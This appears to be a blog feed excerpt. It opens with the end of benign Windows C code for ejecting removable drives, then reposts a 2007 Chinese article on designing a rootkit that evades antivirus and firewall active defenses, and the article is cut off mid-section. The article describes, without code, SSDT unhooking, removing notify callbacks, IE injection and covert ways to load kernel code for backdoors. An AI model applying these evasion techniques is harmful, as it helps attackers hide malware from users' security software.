&amp;nbsp;CloseHandle(hVolume);&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;if ( DiskNumber == -1 ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;return 1;&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;UINT DriveType = GetDriveType(szRootPath);&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;DEVINST DevInst = GetDrivesDevInstByDiskNumber(DiskNumber, DriveType);&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;if ( DevInst == 0 ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;return 1;&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;ULONG Status = 0;&lt;br /&gt;

&amp;nbsp;ULONG ProblemNumber = 0;&lt;br /&gt;

&amp;nbsp;PNP_VETO_TYPE VetoType = PNP_VetoTypeUnknown; &lt;br /&gt;

&amp;nbsp;WCHAR VetoNameW[MAX_PATH];&lt;br /&gt;

&amp;nbsp;bool bSuccess = false;&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;res = CM_Get_Parent(&amp;amp;DevInst, DevInst, 0);&amp;nbsp; // disk's parent, e.g. the USB bridge, the SATA port....&lt;br /&gt;

&amp;nbsp;res = CM_Get_DevNode_Status(&amp;amp;Status, &amp;amp;ProblemNumber, DevInst, 0);&lt;br /&gt;

&amp;nbsp;bool IsRemovable = ((Status &amp;amp; DN_REMOVABLE) != 0);&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;for ( long tries=1; tries&amp;lt;=3; tries++ ) { // sometimes we need some tries...&lt;br /&gt;

&amp;nbsp;&amp;nbsp;VetoNameW[0] = 0;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;if ( IsRemovable ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;res = CM_Request_Device_EjectW(DevInst, &amp;amp;VetoType, VetoNameW, sizeof(VetoNameW), 0); &lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;//res = CM_Request_Device_EjectW(DevInst, &amp;amp;VetoType, NULL, 0, 0);&amp;nbsp; // with MessageBox or 'bubble'&lt;br /&gt;

&amp;nbsp;&amp;nbsp;} else {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;res = CM_Query_And_Remove_SubTreeW(DevInst, &amp;amp;VetoType, VetoNameW, sizeof(VetoNameW), 0); // CM_Query_And_Remove_SubTreeA is not implemented under W2K!&lt;br /&gt;

&amp;nbsp;&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&amp;nbsp;bSuccess = (res==CR_SUCCESS &amp;amp;&amp;amp; VetoType==PNP_VetoTypeUnknown);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;if ( bSuccess )&amp;nbsp; { &lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;break;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;} else {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;Sleep(200); // required to give the next tries a chance!&lt;br /&gt;

&amp;nbsp;&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;if ( bSuccess ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;printf("Success\n\n");&lt;br /&gt;

&amp;nbsp;&amp;nbsp;return 0;&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;printf("failed\n");&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;printf("Result=0x%2X\n", res);&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;if ( VetoNameW[0] ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;printf("VetoName=%ws)\n\n", VetoNameW);&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;return 1;&lt;br /&gt;

}&lt;br /&gt;

//-----------------------------------------------------------&lt;/font&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;font color="#0000ff"&gt;&lt;/font&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&lt;br /&gt;

&lt;font color="#0000ff"&gt;//-----------------------------------------------------------&lt;br /&gt;

DEVINST GetDrivesDevInstByDiskNumber(long DiskNumber, UINT DriveType) {&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;GUID* guid;&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;switch (DriveType) {&lt;br /&gt;

&amp;nbsp;case DRIVE_REMOVABLE:&lt;br /&gt;

&amp;nbsp;&amp;nbsp;//break;&lt;br /&gt;

&amp;nbsp;case DRIVE_FIXED:&lt;br /&gt;

&amp;nbsp;&amp;nbsp;guid = (GUID*)(void*)&amp;amp;GUID_DEVINTERFACE_DISK;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;break;&lt;br /&gt;

&amp;nbsp;case DRIVE_CDROM:&lt;br /&gt;

&amp;nbsp;&amp;nbsp;guid = (GUID*)(void*)&amp;amp;GUID_DEVINTERFACE_CDROM;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;break;&lt;br /&gt;

&amp;nbsp;default:&lt;br /&gt;

&amp;nbsp;&amp;nbsp;return 0;&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;// Get device interface info set handle for all devices attached to system&lt;br /&gt;

&amp;nbsp;HDEVINFO hDevInfo = SetupDiGetClassDevs(guid, NULL, NULL, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;if (hDevInfo == INVALID_HANDLE_VALUE){&lt;br /&gt;

&amp;nbsp;&amp;nbsp;return 0;&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;// Retrieve a context structure for a device interface of a device&lt;br /&gt;

&amp;nbsp;// information set.&lt;br /&gt;

&amp;nbsp;DWORD dwIndex = 0;&lt;br /&gt;

&amp;nbsp;SP_DEVICE_INTERFACE_DATA devInterfaceData = {0};&lt;br /&gt;

&amp;nbsp;devInterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);&lt;br /&gt;

&amp;nbsp;BOOL bRet = FALSE;&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;BYTE Buf[1024];&lt;br /&gt;

&amp;nbsp;PSP_DEVICE_INTERFACE_DETAIL_DATA pspdidd = (PSP_DEVICE_INTERFACE_DETAIL_DATA)Buf;&lt;br /&gt;

&amp;nbsp;SP_DEVICE_INTERFACE_DATA&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; spdid;&lt;br /&gt;

&amp;nbsp;SP_DEVINFO_DATA&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; spdd;&lt;br /&gt;

&amp;nbsp;DWORD&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dwSize;&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;spdid.cbSize = sizeof(spdid);&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;while ( true ){&lt;br /&gt;

&amp;nbsp;&amp;nbsp;bRet = SetupDiEnumDeviceInterfaces(hDevInfo, NULL, guid, dwIndex, &amp;amp;devInterfaceData);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;if (!bRet) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;break;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;SetupDiEnumInterfaceDevice(hDevInfo, NULL, guid, dwIndex, &amp;amp;spdid);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;dwSize = 0;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;SetupDiGetDeviceInterfaceDetail(hDevInfo, &amp;amp;spdid, NULL, 0, &amp;amp;dwSize, NULL);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;if ( dwSize!=0 &amp;amp;&amp;amp; dwSize&amp;lt;=sizeof(Buf) ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;//pspdidd = (PSP_DEVICE_INTERFACE_DETAIL_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;//if ( pspdidd == NULL ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;//return 0; // damn&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;//}&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;pspdidd-&amp;gt;cbSize = sizeof(*pspdidd); // 5 Bytes!&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;ZeroMemory((PVOID)&amp;amp;spdd, sizeof(spdd));&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;spdd.cbSize = sizeof(spdd);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;long res = SetupDiGetDeviceInterfaceDetail(hDevInfo, &amp;amp;spdid, pspdidd, dwSize, &amp;amp;dwSize, &amp;amp;spdd);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;if ( res ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;// the device instance id string contains the serial number if the &lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;// device has one...&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;// char szDevInstId[260] = {0};&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;// SetupDiGetDeviceInstanceId(hDevInfo, &amp;amp;spdd, szDevInstId, 260, NULL);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;// printf("DevInstId=%s\n", szDevInstId);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;HANDLE hDrive = CreateFile(pspdidd-&amp;gt;DevicePath, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if ( hDrive != INVALID_HANDLE_VALUE ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;STORAGE_DEVICE_NUMBER sdn;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DWORD dwBytesReturned = 0;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;res = DeviceIoControl(hDrive, IOCTL_STORAGE_GET_DEVICE_NUMBER, NULL, 0, &amp;amp;sdn, sizeof(sdn), &amp;amp;dwBytesReturned, NULL);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if ( res ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if ( DiskNumber == (long)sdn.DeviceNumber ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CloseHandle(hDrive);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//HeapFree(GetProcessHeap(), 0, pspdidd);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SetupDiDestroyDeviceInfoList(hDevInfo);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return spdd.DevInst;&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CloseHandle(hDrive);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&amp;nbsp;&amp;nbsp;//HeapFree(GetProcessHeap(), 0, pspdidd);&lt;br /&gt;

&amp;nbsp;&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&amp;nbsp;dwIndex++;&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;SetupDiDestroyDeviceInfoList(hDevInfo);&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;return 0;&lt;br /&gt;

}&lt;/font&gt;&lt;/pre&gt;</description></item><item><title>实用级反主动防御rootkit设计思路[转载]</title><link>https://blogs.qipai360.cn/post/practical-anti-active-defense-rootkit-design/</link><pubDate>Thu, 06 Dec 2007 18:06:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/practical-anti-active-defense-rootkit-design/</guid><description>&lt;p&gt;有兴在这次x'con交流会上认识白远方兄弟，这是他很早前写的文章，提到了很多东西，保存一下。 &lt;p&gt;作者：白远方 (ID: baiyuanfan, baiyuanfan@163.com, baiyuanfan@hotmail.com)&lt;br&gt;June 18, 2007&lt;br&gt;关键字：rootkit，反主动防御，网络监控，ring0，mcafee8.5i，KIS6，ZoneAlarm Pro，实用级产品测试&lt;br&gt;目录：&lt;br&gt;反主动防御rootkit的产生背景及其必要性&lt;br&gt;反网络访问主动防御&lt;br&gt;反API钩子进程行为主动防御&lt;br&gt;反系统Notify进程行为主动防御&lt;br&gt;绕过监控进入ring0安装驱动&lt;br&gt;实用级反主动防御rootkit的通用性问题&lt;br&gt;反主动防御rootkit的产生背景及其必要性&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;当前随着新型木马，病毒，间谍软件对网络安全的威胁日益加重，传统的特征查杀型的安全产品和简单的封包过滤型防火墙已不能有效保护用户，因此各大安全公司纷纷推出自己的主动防御型安全产品，例如卡巴斯基kis6，mcafee8.5i，ZoneAlarm Pro等，这些产品应对未知的病毒木马都有很好的效果，若非针对性的作过设计的木马和rootkit，根本无法穿越其高级别防御。因此，反主动防御技术，作为矛和盾的另一方，自然被渗透者们提上日程；由于主动防御安全产品的迅速普及，为了不使后门木马被弹框报警，具有反主动防御能力的rootkit成为了一种必然选择。&lt;br&gt;反网络访问主动防御&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;几乎现在每个防火墙都具有应用程序访问网络限制功能。一个未知的程序反弹连接到外网，或者是在本地监听端口，基本上都会引起报警。而且对系统进程的行为也有了比较严格的审查，原先的注射代码到winlogon等系统进程，在向外反弹连接的方法，很多主动防御软件都会阻止了。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多防火墙的应用程序访问网络限制，都可以通过摘除tcpip.sys上面的过滤驱动，并还原tcpip.sys的Dispatch Routines来绕过。据称这是因为在ndis层次取得进程id不方便而导致的。但是如果在一个实用级的rootkit里应用此方法则是不智之举，因为存在部分防火墙，如ZoneAlarm，其ndis过滤层必须和tdi过滤层协同工作，才会放行网络连接。至于ndis层次的中间层驱动的摘除，和NDIS_OPEN_BLOCK的还原，则是一项不太可能完成的任务，因为无法从原始文件中读取的方法，获得NDIS_OPEN_BLOCK的原始值；即使能够成功恢复ndis钩子，也不能保证系统可以正常运行，很可能会出现各种不明症状。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;到现在为止，绕过应用程序访问网络限制最好的选择，还是那两个：简单的一个，注射代码到一个ie进程，用它反弹连接出来，访问外网；复杂的选择则是应用内核驱动，如ndis hook/添加新的ndis protocol，来实现端口复用，或者使用tdi client driver反弹连接。已经有很多木马和rootkit使用前者，因其简单易行，在实际开发中工程量小，出现问题的可能性也少得多，产品成熟的时间代价也小。但是目前很多的主动防御已经注意到这一点，并且在程序行为监控中严密防范了其他程序对ie的感染行为。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;如图，想要使用僵尸IE访问网络的木马被拦截&lt;br&gt;反API钩子进程行为主动防御&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;接下来是主动防御系统的很重要的一部分：进程行为监控。该部分主动防御软件一般通过两种解决方案来执行，一是API钩子，二是windows支持的notify routine。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;大量的主动防御安全软件，如KIS6，ZoneAlarm Pro，使用API钩子来监控进程的危险行为。如注射远程线程，启动傀儡IE，加载驱动，注册服务，修改敏感系统注册表键值等。但是作为一个rootkit，完全绕过这些操作，基本上是不可能的；于是摆放在面前的任务，就是如何击败这种主动防御。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;对于特定种类的监控，总是有特定的方法可以绕过。比如注射远程线程，如果常用的CreateRemoteThread被监控了，可以尝试采用Debug API， SetThreadContext的方法绕过，也可以尝试采用hook其ntdll!ZwYieldExecution等频繁调用的函数来装载自己的DLL模块。 注册表监控，我的朋友xyzreg曾经写过系列文章，提出了很多种方法，包括RegSaveKey, Hive编辑等方法绕过卡巴斯基的注册表监控，其Hive编辑的方法目前仍未能有任何主动防御系统拦截。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;但是从一个通用型，为实战设计的实用型rootkit来说，采用这些特定的技术并不是一个非常好的选择；因为这些技术可以保证对付一个主动防御软件，却不能保证通用，甚至通用性很差。而且针对每一个可能被主动防御拦截的行为，都采用一套特定的绕过技术，从工程代价上来讲，太过巨大，开发耗时，等其成熟更是不知道要多少时间来测试和更改。因此我们需要的一个相对涵盖范围广，能够解决绝大多数主动防御技术的解决方案。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;针对API钩子实现的进程行为监控，一个较好的通用解决方案就是卸载所有安全软件所安装的API钩子。为兼容性和稳定起见，几乎所有的安全软件在安装API钩子时都会选择hook SSDT表，例如KIS6，ZoneAlarm Pro。我们如果能够进入ring0，就可以使用一个驱动程序，读取系统文件ntoskrnl.exe/ntkrnlpa.exe/ntkrpamp.exe，从中提出我们所希望的SSDT表的原始函数地址，替换被安全软件hook的地址，用此方法可以通用性很好的解决绝大多数的API钩子实现的进程行为监控。不过此方法有一个前提，就是事先必须绕过监控进入ring0。关于如何实现此前提，请阅读第五部分，&amp;#8220;绕过监控进入ring0安装驱动&amp;#8221;。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;如图，ZoneAlarm Pro更改了大量的SSDT函数地址来监控程序行为。&lt;br&gt;反系统Notify进程行为主动防御&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;部分主动防御安全软件不仅仅是用API钩子，同时使用了微软提供的Notify Routine，来监视进程的行为。使用该技术的安全软件不是太多，但是也不至于少到一个实用级别rootkit可以忽略的程度。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;以下几个微软DDK函数，PsSetCreateProcessNotifyRoutine，PsSetCreateThreadNotifyRoutine，PsSetLoadImageNotifyRoutine，被用作支持主动防御软件监控新进程的建立，新线程的建立，和一个新的模块被加载。处理该种类型的防御不能简单的清空NotifyRoutine就完事，因为系统本身，还有一些第三方正常模块和驱动，可能添加和使用该链表。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;解决方案，一是可以先将使用了该技术的主动防御系统的驱动程序模块做一个列表出来，然后遍历这三条链表，找出地址指向这些驱动模块的项，再将这些项删除脱链。但是这需要对大量主动防御系统的研究和测试，并且通用型也不好。第二种方法，由于Notify Routine的监控力度要远弱于API钩子，因此在纯ring3将程序做一些小的改动，就可以越过这种类型的监控。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;另外还有几个SDK函数，可以提供对文件和注册表的更改的notify。不能排除也有部分主动防御软件使用了它们。例如国产的超级巡警(AST.exe)，使用了RegNotifyChangeKeyValue，做了对注册表敏感键值修改的事后警告提示。如果仅仅使用了API钩子清除技术，那么在此时就会被AST报警。和以上介绍的三个内核notify类似的也是，有不少正常的notify在被使用，不分青红皂白的全部卸载，会导致系统异常。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;因此可见，Notify类监控虽然使用的不多，但是其对付的难度和需要的工程量，比API监控还要大。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;如图，已经处理了API钩子监控的rootkit仍然被notify方式的AST报警。&lt;br&gt;绕过监控进入ring0安装驱动&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这部分是重中之重。由于几乎每个主动防御系统都会监控未知驱动的加载和试图进入ring0的举动， 而我们在第一，第二和第三部分绕过主动防御要做的处理，都必须需要ring0权限。因此监控进入ring0，是一个独立的话题，也是我们实现前三个部分需要的条件。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;直接添加注册表项，ZwLoadDriver安装驱动，是几乎要被任何主动防御系统报警。必须要采用一些隐蔽的或者是为人不知的方法。总结目前已经公布出来的进入ring0的办法，&lt;br&gt;有以下几种：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;感染文件，例如win32k.sys，添加自己的代码到里面，启动的时候就会被执行。这种方法的优点是简单易行，稳定度和兼容性很好。但是最大的缺点就是必须重新启动以后，才能进入ring0，这是一个产品级别的后门所不能容忍的。而且微软自己的系统文件保护容易绕过，mcafee和卡巴斯基的文件监控可就不是那么容易了。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;利用物理内存对象，来写入自己的代码到内核，并添加调用门来执行。这个是最早被人提出的不用驱动进入ring0的办法。因为出来的时间太长了，所以有以下一些问题：更新的操作系统内核不支持，如2003SP1；很多的主动防御系统会拦截，例如KIS6。所以这个办法也不理想。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;利用ZwSystemDebugControl。这个代码在国外有人放出来过，利用它写内存，挂钩NtVdmControl，进入ring0。此法缺陷在于老的windows2000不被支持，最新的windows2003sp1上也取消了这个函数的此能力。不过好处在于，这个方法用的人少，基本上没有主动防御会注意到它，并进行拦截。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;利用ZwSetSystemInformation的SystemLoadAndCallImage功能号加载一个模块进入ring0。这个方法提出来比较久了，但是因为用的人少，仍未被主动防御软件所重视。用得少的原因是，它不好用。它只能加载一个普通的模块到内核并且调用，却不是加载一个驱动，因此没有一个DriverObject。这导致了非常多的麻烦。因为要想使用这个办法，必须先用这个办法安装一个简单的内核模块，再用这个模块添加调用门等方式，执行代码清除主动防御的监视驱动安装的钩子，安装一个正常的驱动，才能最终完成任务。而且这个方法似乎对windows2003sp1以上的系统也无效。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;因此，要想有一个相对完美的进入ring0解决方案，最好是寻找别人不知道或者使用很少的方法，或者将上面的有缺陷的方法做一个综合，用多种方法通过判断情况来选择使用。我在这里有一个新的思路提供给大家，微软新公布了一部分文档，关于HotPatch的使用。HotPatch可以在执行中修改系统中存在的用户态公用dll的内容，甚至是修改内核模块的内容。具体代码和细节，在这里我不能多说。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;要想开发一个好的反主动防御rootkit，绕过监控进入ring0是必不可少的，然而这部分也是使用不成熟技术最多的，最容易出现严重问题的部分。作为一个负责任的实用级产品，一定要对这个部分作做详细的测试，来保证自己的产品不会在某些特殊的环境，比如64位CPU运行32位系统，多核处理器，HyperThread处理器上面，出现故障或者蓝屏。&lt;br&gt;实用级反主动防御rootkit的通用性问题&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;前文已述，本文的宗旨在于讨论一种实用级别rootkit开发的可行性。因此，工程量的大小，需要投入的人力，时间和金钱，也是我们需要考虑的内容。必须要考虑更好的兼容性通用性，和工程上的开发代价和稳定成熟周期不能无限大。因此，对于部分新技术，例如BiosRootkit，VirtualMachine-Rootkit，本文不做讨论，因为那些都属于如果要想做稳定通用，工程代价非常大，以至于他们只拥有技术上面的讨论价值，而不具备作为一个产品开发的可选解决方案的可能性。至少是目前来看是如此。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;每个主动防御软件的原理和构造都是不相同的，因此不可能指望有某一种方法，从工程上可以解决一个主动防御系统，就可以无需测试的，保证无误的解决其他系统。因为这个原因，开发一个成熟稳定的反主动防御rootkit，必然要在兼容各种主动防御的系统的通用性上面下大功夫。按照不同的主动防御系统，在程序里switch case，应该是非常必要的，尽管绝大多数反主动防御代码原理上可以通用。基本上，在测试程序通用型的时候，常用的主动防御软件，是每种都要安装一个并且仔细测试的。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;以下举例说明，几个常用主动防御系统各自需要注意的特点，这都是笔者在实际开发中遇到的比较典型的例子。&lt;br&gt;Mcafee8.5，该主动防御软件在最大化功能时会禁止在系统目录下创建可执行文件，光这一点就会让几乎全部rootkit安装失败，若非针对它做了设计。在这个系统下面，也不可能使用感染文件的方法来进入ring0。&lt;br&gt;KIS6，该系统会自动列举运行的隐藏进程，并且弹框警告。因此在这系统下，不太可能把自己的进程隐藏。而且它列举隐藏进程的手段很底层，很难绕过。&lt;br&gt;ZoneAlarm 